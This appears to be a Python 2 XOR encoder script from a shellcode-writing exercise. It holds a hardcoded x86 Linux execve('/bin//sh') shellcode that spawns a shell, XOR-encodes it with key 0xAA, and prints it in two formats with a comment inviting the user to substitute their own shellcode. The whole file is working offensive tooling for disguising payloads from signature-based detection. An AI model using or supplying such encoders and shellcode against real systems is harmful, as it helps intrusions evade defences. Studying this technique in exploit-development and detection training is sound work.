#!/usr/bin/python

# python code for xor encoder

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")			#place your shellcode here

encoded = ""
encoded2 = ""

print "Encoded Shellcode ....."

for x in bytearray(shellcode):
	# xor encoding
	y = x^0xAA
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

print 'Length: %d' % len(bytearray(shellcode))
